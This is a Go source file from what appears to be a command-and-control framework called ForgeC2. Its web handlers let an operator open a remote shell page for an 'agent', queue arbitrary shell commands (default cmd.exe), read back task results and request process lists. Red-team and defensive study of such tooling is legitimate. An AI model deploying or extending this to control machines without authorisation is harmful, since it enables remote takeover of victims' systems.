package server

import (
	"bytes"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleShellPage(c *gin.Context) {
	id := c.Param("id")
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	if time.Since(agent.LastSeen) > OfflineThreshold {
		agent.Status = "offline"
	} else {
		agent.Status = "online"
	}

	data := gin.H{
		"Title":     fmt.Sprintf("ForgeC2 - Shell %s", agent.Hostname),
		"ActiveNav": "agents",
		"Agent":     agent,
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "shell_content", data); err != nil {
		slog.Error("Failed to render shell content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleSendCommand(c *gin.Context) {
	id := c.Param("id")
	cmd := c.PostForm("command")
	shell := c.PostForm("shell")
	if shell == "" {
		shell = "cmd.exe"
	}

	slog.Info("handleSendCommand called", "agent_id", id, "command", cmd)

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "shell",
		Command: cmd,
		Shell:   shell,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", cmd)
	s.LogAuditRecord(c, "send_command", "agent", id, cmd, true, nil)
	s.broadcastTaskUpdate(id, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleGetAgentTasks(c *gin.Context) {
	id := c.Param("id")

	var tasks []db.Task
	s.db.Where("agent_id = ?", id).
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop"}).
		Order("created_at desc").Limit(AgentTasksLimit).Find(&tasks)

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agent_tasks_list", gin.H{"Tasks": tasks}); err != nil {
		slog.Error("Failed to render tasks", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, contentBuf.String())
}

func (s *Server) handleGetTaskStatus(c *gin.Context) {
	taskID := c.Param("taskId")

	var task db.Task
	if err := s.db.First(&task, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"id":      task.ID,
		"status":  task.Status,
		"result":  task.Result,
		"error":   task.Error,
		"command": task.Command,
	})
}

func (s *Server) handleRequestPS(c *gin.Context) {
	id := c.Param("id")

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "ps",
		Command: "",
		Status:  "pending",
	}
	s.db.Create(&task)

	slog.Info("Process list requested", "agent", id)
	s.LogAuditRecord(c, "request_ps", "agent", id, "process list", true, nil)
	s.broadcastTaskUpdate(id, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}
